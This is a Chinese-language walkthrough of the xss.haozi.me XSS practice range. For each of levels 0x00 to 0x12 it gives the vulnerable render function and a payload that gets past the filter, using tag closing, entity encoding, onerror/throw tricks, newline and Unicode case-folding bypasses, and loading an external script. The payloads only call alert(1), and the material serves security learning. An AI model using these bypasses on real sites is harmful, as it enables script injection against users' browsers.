# https://xss.haozi.me/#/0x00
一个很有意思的靶场
## 0x00 #反射型XSS
servercode
```html
function render (input) {
  return '<div>' + input + '</div>'
}
```
input
```HTML
<script>alert(1)</script>
```

## 0x01
servercode
```html
function render (input) {
  return '<textarea>' + input + '</textarea>'
}
```
input
```html
</textarea><script>alert(1)</script><div>wumonster</div>
```

插入 `</textarea>`进行闭合思路和sql闭合类似

## 0x02
servercode
```html
function render (input) {
  return '<input type="name" value="' + input + '">'
}
```
input
```html
"><script>alert(1);</script>
```

## 0x03
过滤`()`，throw绕过
servercode
```html
function render (input) {
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```
input
```html
<svg onload="window.onerror=eval;throw'=alert\x281\x29';">
<script>alert`1`;</script>
```
- onload -> onload 事件会在页面或图像加载完成后立即发生;onload 通常用于 `<body>` 元素，在页面完全载入后(包括图片、css文件等等。)执行脚本代码。
-  onerror ->onerror 事件在加载外部文件（文档或图像）发生错误时触发

## 0x04
过滤`()`
用html编码
servercode
```js
function render (input) {
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```
input
```html
<img src="" onerror=alert&lpar;&#49;&rpar;>
```

## 0x05
两种注释方法
`<!-- --!>`
`<!-- -->`
servercode
```js
function render (input) {
  input = input.replace(/-->/g, '😂')
  return '<!-- ' + input + ' -->'
}
```
input
```html
--!><script>alert(1);</script><！--
```

## 0x06
过滤auto 和 on 开头且以=结尾的字符串 和 >
换行绕过
servercode
```js
function render (input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `<input value=1 ${input} type="text">`
}
```
input
```html
type="image" src="" onerror
=alert(1)
```

## 0x07
匹配 `</ 任意字符 >`
servercode
```js
function render (input) {
  const stripTagsRe = /<\/?[^>]+>/gi

  input = input.replace(stripTagsRe, '')
  return `<article>${input}</article>`
}
```
input
```html
<img src="" onerror=alert(1) 
```


## 0x08
匹配 `</style>`
加一个空格就可以绕过但是html是可以解析的
servercode
```js
function render (src) {
  src = src.replace(/<\/style>/ig, '/* \u574F\u4EBA */')
  return `
    <style>
      ${src}
    </style>
  `
}
```
input
```html
</style ><script>alert(1);</script>
```

## 0x09

servercode
```js
function render (input) {
  let domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${input}"></script>`
  }
  return 'Invalid URL'
}
```
input
```html
https://www.segmentfault.com"></script><img src="" onerror="alert(1) 
https://www.segmentfault.com1" onerror="alert(1) 
```

## 0x0A #文件包含

servercode
```js
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f')
  }

  const domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${escapeHtml(input)}"></script>`
  }
  return 'Invalid URL'
}
```
input
```html
https://www.segmentfault.com@xss.haozi.me/j.js
<!-- 理论上将是可以这样来引入有漏洞的页面的，但是这里似乎是有什么安全策略没办法跳转，用下面的那个可以重定向过去 -->

https://www.segmentfault.com.haozi.me/j.js
```

## 0x0B
html对大小写不敏感
js对大小写敏感
servercode
```js
function render (input) {
  input = input.toUpperCase()
  return `<h1>${input}</h1>`
}
```
input
```html
<img src="" onerror=&#97;&#108;&#101;&#114;&#116;(1);>
```

## 0x0C
servercode
```js
function render (input) {
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```
input
```html
<img src="" onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

## 0x0D
单行注释直接回车
servercode
```js
function render (input) {
  input = input.replace(/[</"']/g, '')
  return `
    <script>
          // alert('${input}')
    </script>
  `
}
```
input
```html

alert('1');
-->
```


## 0x0E
这个绕过是利用字符大小写的区别的
`ſ`的大写是S，应该是古英语的转换问题，反找就行
[Unicode字符表 (rapidtables.org)](https://www.rapidtables.org/zh-CN/code/text/unicode-characters.html)
servercode
```js
function render (input) {
  input = input.replace(/<([a-zA-Z])/g, '<_$1')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

input
```html
<ſcript src="" onerror=&#97;&#108;&#101;&#114;&#116;(1)></script>
```

## 0x0F
在html的标签中编码是可以被识别的所以直接不管
servercode
```js
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f;')
  }
  return `<img src onerror="console.error('${escapeHtml(input)}')">`
}
```
input
```html
'); alert('1
```

## 0x10
在后面接就可以了
servercode
```js
function render (input) {
  return `
<script>
  window.data = ${input}
</script>
  `
}
```
input
```html
''; alert(1)
```

## 0x11
转义了一些字符
servercode
```js
// from alf.nu
function render (s) {
  function escapeJs (s) {
    return String(s)
            .replace(/\\/g, '\\\\')
            .replace(/'/g, '\\\'')
            .replace(/"/g, '\\"')
            .replace(/`/g, '\\`')
            .replace(/</g, '\\74')
            .replace(/>/g, '\\76')
            .replace(/\//g, '\\/')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t')
            .replace(/\f/g, '\\f')
            .replace(/\v/g, '\\v')
            // .replace(/\b/g, '\\b')
            .replace(/\0/g, '\\0')
  }
  s = escapeJs(s)
  return `
<script>
  var url = 'javascript:console.log("${s}")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
`
}
```
input
```html
");alert(1);//
");alert("1
```

## 0x12

直接`<script>`闭合
转义`"`,没有转义`\`所以把它的`\`转义了就行，或者直接闭合标签
servercode
```js
// from alf.nu
function escape (s) {
  s = s.replace(/"/g, '\\"')
  return '<script>console.log("' + s + '");</script>'
}
```
input
```html
</script><script>alert(1);</script><script>
\");alert(1);//
```